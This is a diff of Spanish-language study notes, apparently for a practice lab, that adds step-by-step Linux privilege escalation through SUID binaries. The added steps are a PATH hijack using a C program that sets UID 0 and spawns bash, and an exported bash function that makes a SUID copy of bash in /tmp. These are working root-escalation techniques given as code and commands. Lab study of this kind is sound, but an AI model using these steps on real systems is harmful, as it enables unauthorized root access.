@@ -142,7 +142,8 @@ Para entender la línea del script `PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/
 
 
 ## 🔐SUDO
-El comando `sudo -l` lista los comandos que el usuario actual **tiene permitidos ejecutar con `sudo`**, sin necesidad de contraseña si aparece `NOPASSWD:`.
+
+El comando `sudo -l` lista los comandos que el usuario actual **tiene permitidos ejecutar con `sudo`**, sin necesidad de contraseña si aparece `NOPASSWD:`. 
 
 Algunos de los comandos tienen escalada de privilegios, más información disponible en [este repositorio](https://gtfobins.github.io/)
 
@@ -497,7 +498,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 Este comando es útil porque permite encontrar **archivos ejecutables con el bit SUID activado**, los cuales pueden ser explotados para escalar privilegios si son vulnerables, con esta información lo siguiente sería investigar uno por uno para ver si sus versiones tienen vulnerabilidades interesantes.
 
-Para esta práctica, nos centramos en `/usr/local/bin/suid-so` 
+### 👉Escalando por `suid-so` 
 
 Analizamos este recurso con
 ```bash
@@ -556,7 +557,7 @@ gcc libcalc.c -shared -o libcalc.so -fPIC
 
 **4.** Ejecutamos **el binario que utiliza esta biblioteca**, es decir
 
-```
+```bash
 /usr/local/bin/suid-so
 ```
 Cuando finalice esta ejecución, veremos un nuevo archivo en `/tmp/`
@@ -570,3 +571,132 @@ cd /tmp/
 ```
 
 **🎉 Escalada conseguida**
+
+
+### 👉Escalando por `suid-env` 
+Analizamos este recurso con el comando `strings` para saber qué alimenta a este binario. El comando `strings` lee archivos binarios y busca elementos legibles.
+
+```bash
+strings /usr/local/bin/suid-env
+```
+
+Del comando, obtenemos una salida como la siguiente
+
+```
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+
+En esta ocasión, intentaremos *confundir* a la máquina haciendo que ejecute un binario `service` que creamos nosotros, realizando cambios en el **PATH** del sistema.
+
+**¿Por qué?** El *path* es una variable del sistema, donde el usuario puede especificar las rutas **donde el sistema pueda buscar cualquier binario** que el usuario desee ejecutar. Y si nosotros siendo el usuario podemos controlar el path, podemos cambiar cómo funciona.
+
+Podemos consultar las variables del sistema con el comando `env`.
+
+**💪 MANOS A LA OBRA**
+
+En primer lugar, creamos el código malicioso, en la ruta `/home/user/` con el nombre `service.c` y escribimos el siguiente código.
+```C
+int main() {
+	setgid(0); //Establece el GID (grupo) en 0 (grupo 0 = root)
+	setuid(0); //Establece el UID (usuario) en 0 (usuario 0 = root)
+	system("/bin/bash"); //Abre una shell
+	return 0;
+}
+```
+
+Y lo compilamos
+```bash
+gcc /home/user/service.c -o /home/user/service
+```
+
+Una vez creado el binario, toca modificar el **path**. Para ello, ejecutamos el comando
+```bash
+export PATH=/home/user:$PATH
+```
+
+**¿Qué está haciendo esta línea?** Básicamente decirle al sistema: quiero que la variable PATH comience con `/home/user`, los `:` delimitan donde termina una ruta, y `$PATH` es el valor que tenía anteriormente.
+
+Comprobamos que los cambios hayan sido efectivos con el comando `env`. Y si la variable comienza con `/home/user` ya podemos continuar.
+
+Ahora, solo queda ejecutar el binario principal
+```bash
+/usr/local/bin/suid-env
+```
+
+Y automáticamente, este binario nos convertirá en root. **🎉 Escalada conseguida**
+
+### 👉Escalando por `suid-env2`
+Del mismo modo que con `suid-env`, analizamos este binario con `strings`
+```bash
+strings /usr/local/bin/suid-env2
+```
+
+Vemos una salida similar al anterior, pero en este caso, la llamada a `service` se hace con una **ruta absoluta** por lo que crear uno en otra ruta controlada no es posible.
+
+```
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+```
+
+❌ Y si verificamos qué permisos tenemos sobre el binario, tenemos permisos de lectura y ejecución, por lo que modificar el archivo original tampoco es una opción
+
+✅ Lo que **sí** podemos intentar, es **crear una función a nivel bash con el mismo nombre**, pero que haga lo que nosotros queremos que haga (darnos privilegios).
+
+>[!abstract] Definición exprés:
+>Una **función en Bash** es una forma de agrupar comandos bajo un nombre para poder ejecutarlos fácilmente varias veces.
+>**Son estructuras internas de Bash**, que viven en la **memoria del proceso de la shell**, y **no existen como archivos ni procesos**. Sólo son visibles dentro del mismo entorno de ejecución de la shell **hasta que se exportan**.
+
+💪**MANOS A LA OBRA**
+
+**1. Creamos** la función
+```bash
+function /usr/sbin/service() { cp /bin/bash /tmp/servicebash && chmod +s /tmp/servicebash; }
+```
+
+**2. La exportamos** para que esté dentro del entorno
+```bash
+export -f /usr/sbin/service
+```
+Comprobamos que se ha exportado si al ejecutar `env`, vemos nuestra función en la salida.
+
+**3. Ejecutamos** el binario principal
+```bash
+/usr/local/bin/suid-env2
+```
+
+**4. Si todo es correcto**, veremos una nueva bash en `/tmp` llamada `servicebash`, la cual podemos ejecutar para acceder a root
+```bash
+./servicebash -p
+```
+
+**🎉 Escalada conseguida**
+
+>[!note] Nota:
+>Este tipo de exploit sólo funciona si se cumplen condiciones muy específicas, como que el binario esté **dinámicamente enlazado** con Bash, o que el binario **no limpie el entorno** antes de ejecutar comandos.
